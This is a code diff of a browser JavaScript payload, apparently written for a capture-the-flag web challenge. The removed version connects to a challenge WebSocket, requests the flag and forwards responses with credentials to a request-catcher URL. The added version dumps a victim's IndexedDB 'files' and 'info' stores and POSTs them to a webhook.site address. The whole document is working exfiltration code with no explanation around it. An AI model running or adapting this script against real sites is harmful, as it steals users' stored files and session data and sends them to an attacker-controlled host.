@@ -1,45 +1,43 @@
-const WEBHOOK = "https://totototo.requestcatcher.com";
+WEBHOOK = "https://webhook.site/22adc411-5a6c-4d97-87b6-8c2f641bdb6c";
 
-function webhook(domain = "", data = null) {
-  let req = new XMLHttpRequest();
-  req.open("POST", WEBHOOK + domain, false);
-  req.withCredentials = true;
-  req.send(data);
+function post(url, data) {
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", url, true);
+  return xhr.send(JSON.stringify(data));
 }
 
-console.log("/init");
+(async () => {
+  const request = indexedDB.open("Files", 1);
+  request.onsuccess = async () => {
+    const db = request.result;
 
-let socket;
+    const readStore = (storeName) => {
+      return new Promise((resolve, reject) => {
+        try {
+          const tx = db.transaction(storeName, "readonly");
+          const store = tx.objectStore(storeName);
+          const req = store.getAll();
+          req.onsuccess = () => resolve(req.result);
+          req.onerror = () => reject(req.error);
+        } catch (error) {
+          post(WEBHOOK + "?error", { ...error, storeName });
+        }
+      });
+    };
 
-// Initialize WebSocket connection
-function initWebSocket() {
-  socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+    const files = await readStore("files");
+    const info = await readStore("info");
 
-  socket.onopen = () => {
-    console.log("/onopen");
+    console.log("=== IndexedDB Dump ===");
+    console.log("Files Store:", files);
+    console.log("Info Store:", info);
+
+    post(WEBHOOK + "?success", files);
+    post(WEBHOOK + "?success", info);
   };
+  request.onerror = (event) => {
+    console.error("Why didn't you allow my web app to use IndexedDB?!");
 
-  socket.onmessage = (event) => {
-    // const messageData = JSON.parse(event.data);
-    console.log("/onmessage", event.data);
-    sendMessage({ sender: "user", message: "/getFlag" });
-    webhook("/onmessage", event.data);
+    post(WEBHOOK + "?error", event);
   };
-
-  socket.onclose = () => {
-    console.log("/onclose");
-  };
-
-  socket.onerror = (error) => {
-    console.log("/onerror", error);
-  };
-}
-
-// Send message to the server and display it locally
-function sendMessage(data) {
-  // { sender: "user", message }
-  socket.send(JSON.stringify(data));
-}
-
-// Initialize WebSocket connection on page load
-initWebSocket();
+})();
